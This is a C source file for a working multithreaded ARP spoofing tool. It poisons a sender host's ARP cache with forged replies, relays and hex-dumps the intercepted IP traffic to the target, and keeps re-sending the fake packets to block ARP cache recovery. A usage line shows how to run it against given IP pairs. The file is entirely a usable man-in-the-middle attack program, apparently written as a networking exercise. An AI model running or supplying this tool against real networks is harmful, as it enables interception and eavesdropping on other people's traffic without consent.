#include <stdio.h>
#include <pthread.h>
#include <pcap.h> 
#include <stdint.h>
//#include <stdlib.h>
#include <libnet/include/libnet.h>
//#include <string.h>
//#include <sys/socket.h>
//#include <sys/ioctl.h>
//#include <net/if.h>
#include <netinet/ether.h> //ether_ntoa()
//#include <net/ethernet.h>
//#include <netinet/ip.h>
//#include <netinet/in.h>
//#include <arpa/inet.h>


#define IP_ADDR_LEN 4
#define BROADCAST_ADDR "\xff\xff\xff\xff\xff\xff"
#define NULL_ADDR "\x00\x00\x00\x00\x00\x00"

#pragma pack(push,1)
struct arp_structure {
  struct libnet_ethernet_hdr eth_hdr;
  struct libnet_arp_hdr arp_hdr;
  uint8_t sender_hw_addr[ETHER_ADDR_LEN];
  uint8_t sender_ip_addr[IP_ADDR_LEN];
  uint8_t target_hw_addr[ETHER_ADDR_LEN];
  uint8_t target_ip_addr[IP_ADDR_LEN];
};

struct session {
  int num;
  char* dev;
  char* sender_ip;
  char* target_ip;
}; 
#pragma pack(pop)

void make_arp(uint8_t *packet, uint8_t *src_mac, uint8_t *dst_mac, uint8_t *src_ip, uint8_t *dst_ip, uint16_t opcode) {
  struct arp_structure *arp = (struct arp_structure *) malloc(sizeof(struct arp_structure));

  arp->eth_hdr.ether_type = htons(ETHERTYPE_ARP);
  arp->arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
  arp->arp_hdr.ar_pro = htons(ETHERTYPE_IP);
  arp->arp_hdr.ar_hln = ETHER_ADDR_LEN;
  arp->arp_hdr.ar_pln = IP_ADDR_LEN;
  arp->arp_hdr.ar_op = htons(opcode);

  if(dst_mac == NULL) memcpy(arp->eth_hdr.ether_dhost, BROADCAST_ADDR, ETHER_ADDR_LEN);
  else memcpy(arp->eth_hdr.ether_dhost, dst_mac, ETHER_ADDR_LEN);

  memcpy(arp->eth_hdr.ether_shost, src_mac, ETHER_ADDR_LEN);

  if(dst_mac == NULL) memcpy(arp->target_hw_addr, NULL_ADDR , ETHER_ADDR_LEN);
  else memcpy(arp->target_hw_addr, dst_mac, ETHER_ADDR_LEN);

  memcpy(arp->sender_hw_addr, src_mac, ETHER_ADDR_LEN);
  memcpy(&arp->sender_ip_addr, src_ip, IP_ADDR_LEN);
  memcpy(&arp->target_ip_addr, dst_ip, IP_ADDR_LEN);

  memcpy(packet, arp, sizeof(struct arp_structure));
  free(arp);
}

void dump(const u_char* p, int len) {
  if(len<=0) {
    printf("None\n");
    return;
  }
  for(int i =0; i < len; i++) {
    printf("%02x ", *p);
    p++;
    if((i & 0x0f) == 0x0f)
      printf("\n");
  }
  printf("\n");
}

void get_mac_address(pcap_t *handle, struct pcap_pkthdr *header, uint8_t *packet_s, const uint8_t *packet_r, struct arp_structure *arp, struct in_addr ip_address ,uint8_t mac_address[], struct session *ses ) {
  if(pcap_sendpacket(handle, packet_s, sizeof(struct arp_structure)) != 0)
    {printf("(ses[%d]) ",ses->num); perror("pcap_sendpacket"); exit(EXIT_FAILURE);}
// receive ARP reply
  while(1) {
    pcap_next_ex(handle, &header, &packet_r);
    arp = (struct arp_structure *) packet_r; 
    if(ntohs(arp->eth_hdr.ether_type) != ETHERTYPE_ARP) continue;
    if(ntohs(arp->arp_hdr.ar_op) != ARPOP_REPLY) continue;
    if(memcmp(arp->sender_ip_addr, &ip_address, IP_ADDR_LEN) != 0) continue;
    memcpy(mac_address, arp->sender_hw_addr, ETHER_ADDR_LEN);
    break;
  } 
}
void send_fake_packet(pcap_t *handle, uint8_t *packet_s, struct session *ses ) {
  if(pcap_sendpacket(handle, packet_s, sizeof(struct arp_structure)) != 0)
    {printf("(ses[%d]) ",ses->num); perror("pcap_sendpacket"); exit(EXIT_FAILURE);}
  else printf("(ses[%d]) Send ARP Packet. ARP Recovery Blocked.\n",ses->num);
}

void* spoofing(void* arg) { 
  struct session* ses = (struct session*) arg;
  struct ifreq ifr;
  struct pcap_pkthdr *header;

  char errbuf[PCAP_ERRBUF_SIZE];
  uint8_t sender_mac[ETHER_ADDR_LEN];
  uint8_t target_mac[ETHER_ADDR_LEN];
  uint8_t attacker_mac[ETHER_ADDR_LEN];
  struct in_addr sender_ip;
  struct in_addr target_ip;
  struct in_addr attacker_ip;

 /* For static_cast Different Types of Pointers  */
  void *v_sender_ip = &sender_ip.s_addr;
  void *v_target_ip = &target_ip.s_addr; 
  void *v_attacker_ip = &attacker_ip.s_addr;

  uint8_t *packet_s = (uint8_t *) malloc(sizeof(struct arp_structure));  
  const uint8_t *packet_r;
  struct arp_structure *arp; 

  int sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock < 0) { printf("(ses[%d]) ",ses->num); perror("socket"); exit(EXIT_FAILURE);}  
  		
  pcap_t *handle = pcap_open_live(ses->dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", ses->dev, errbuf);
    exit(EXIT_FAILURE);
  }

  inet_pton(AF_INET, ses->sender_ip, &sender_ip);
  inet_pton(AF_INET, ses->target_ip, &target_ip);
  strncpy(ifr.ifr_name, ses->dev, strlen(ses->dev)+1);

  if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) 
    {printf("(ses[%d]) ",ses->num); perror("ioctl"); exit(EXIT_FAILURE);}
  memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);

  if(ioctl(sock, SIOCGIFADDR,  &ifr) < 0)
    {printf("(ses[%d]) ",ses->num); perror("ioctl"); exit(EXIT_FAILURE);}
  attacker_ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;

  make_arp(packet_s, attacker_mac, NULL, static_cast<uint8_t *> (v_attacker_ip), static_cast<uint8_t *> (v_sender_ip), ARPOP_REQUEST);
  
  printf("(Ses[%d]) Send ARP Request: Attacker -> Sender\n", ses->num );  

  //printf("(Ses[%d]) ---Dump Request Packet---\n", ses->num );
  //dump(packet_s, sizeof(struct arp_structure));
  //printf("\n");

  get_mac_address(handle, header, packet_s, packet_r, arp, sender_ip ,sender_mac , ses);
  printf("(Ses[%d]) Receive ARP Reply: Sender -> Attacker\n",ses->num);
 
  make_arp(packet_s, attacker_mac, NULL, static_cast<uint8_t *> (v_attacker_ip), static_cast<uint8_t *> (v_target_ip), ARPOP_REQUEST);
  printf("(Ses[%d]) Send ARP Request: Attacker -> target\n", ses->num );  

  //printf("(Ses[%d]) ---Dump Request Packet---\n", ses->num );
  //dump(packet_s, sizeof(struct arp_structure));
  //printf("\n");

  get_mac_address(handle, header, packet_s, packet_r, arp, target_ip, target_mac, ses);
 
  printf("(Ses[%d]) Receive ARP Reply: target -> Attacker\n",ses->num);
  printf("\n(ses[%d]) ---MAC & IP address Info.---\n",ses->num);
  printf("(Ses[%d]) [Attacker MAC]: %s\n", ses->num, ether_ntoa((struct ether_addr *)attacker_mac) );
  printf("(Ses[%d]) [Attacker IP]: %s\n", ses->num, inet_ntoa(attacker_ip));
  printf("(Ses[%d]) [Sender MAC]: %s\n", ses->num, ether_ntoa((struct ether_addr *)sender_mac));
  printf("(Ses[%d]) [Sender IP]: %s\n", ses->num, inet_ntoa(sender_ip));
  printf("(Ses[%d]) [Target MAC]: %s\n", ses->num, ether_ntoa((struct ether_addr *)target_mac));
  printf("(Ses[%d]) [Target IP]: %s\n\n", ses->num, inet_ntoa(target_ip));

  make_arp(packet_s, attacker_mac, sender_mac, static_cast<uint8_t *> (v_target_ip), static_cast<uint8_t *> (v_sender_ip), ARPOP_REPLY);

  printf("(Ses[%d]) Send ARP Reply Attack: Attacker -> Sender\n", ses->num); 
  //printf("(Ses[%d]) ---Dump Attack Packet---\n", ses->num);
  //dump(packet_s,sizeof(struct arp_structure));
  //printf("\n");

  if(pcap_sendpacket(handle, packet_s, sizeof(struct arp_structure)) != 0)
    {printf("(ses[%d]) ",ses->num); perror("pcap_sendpacket"); exit(EXIT_FAILURE);}
  else printf("(Ses[%d]) ARP Attack Complete.\n",ses->num);

  while(1) {
    struct libnet_ethernet_hdr *eth;
    struct arp_structure *arp;
    pcap_next_ex(handle, &header, &packet_r);
    eth = (struct libnet_ethernet_hdr *) packet_r;
    arp = (struct arp_structure *) packet_r;
// ip packet relay
    if(memcmp(eth->ether_shost, sender_mac, ETHER_ADDR_LEN) == 0 ) {
      if(ntohs(eth->ether_type) == ETHERTYPE_IP ) {
        printf("(Ses[%d]) Relay to Target: Attacker -> Target\n", ses->num); 
        dump(packet_r, header->len);
        printf("\n");
        memcpy(eth->ether_shost , attacker_mac, ETHER_ADDR_LEN);
        memcpy(eth->ether_dhost , target_mac, ETHER_ADDR_LEN);
        
        if(pcap_sendpacket(handle, packet_r, header->len) != 0) 
          {printf("(ses[%d]) ",ses->num); perror("pcap_sendpacket"); continue;}
      }
//arp_recovery
      else if(ntohs(eth->ether_type) == ETHERTYPE_ARP && ntohs(arp->arp_hdr.ar_op) == ARPOP_REQUEST) send_fake_packet(handle,packet_s,ses);    
      else continue;
    }
    else {
      if(!memcmp(eth->ether_shost, target_mac, ETHER_ADDR_LEN) ) send_fake_packet(handle,packet_s,ses);
      else continue;
    }
  } 
  
  free(packet_s);
  pcap_close(handle);
}

void usage() {
  printf("syntax: sudo ./arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: sudo ./arp_spoof ens33 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
  if ((argc % 2) != 0 || argc < 4) {
    usage();
    return -1;
  }

  int status;
  struct session ses[(argc-2)/2];
  pthread_t thread[(argc-2)/2];
  
  for(int i=0; i < ((argc-2)/2); i++) {
    ses[i].num = i;
    ses[i].dev = argv[1];
    ses[i].sender_ip = argv[2*i+2];
    ses[i].target_ip = argv[2*i+3];
  } 
  for(int i=0; i<((argc-2)/2); i++) {
    if( pthread_create(&thread[i], NULL, &spoofing, (void*) &ses[i]) != 0 )
      perror("Thread create:");
  }
  for(int i=0 ; i<((argc-2)/2) ;i++) 
    pthread_join(thread[i], (void**)&status);

  return 0;
}
